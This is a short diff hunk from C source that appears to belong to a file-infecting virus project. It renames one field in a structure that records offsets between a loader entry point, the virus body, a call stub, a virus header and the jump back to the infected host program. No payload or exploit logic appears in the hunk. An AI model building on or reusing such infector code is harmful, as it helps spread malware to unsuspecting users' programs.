@@ -23,7 +23,7 @@ void	_start(void)
 		.dist_virus_loader   = (size_t)virus - (size_t)loader_entry,
 		.dist_vircall_loader = (size_t)call_virus - (size_t)loader_entry,
 		.dist_header_loader  = (size_t)virus_header_struct - (size_t)loader_entry,
-		.dist_client_loader  = (size_t)jump_back_to_client - (size_t)loader_entry
+		.dist_jmpclient_loader = (size_t)jump_back_to_client - (size_t)loader_entry
 	};
 
 	virus(&vhdr);
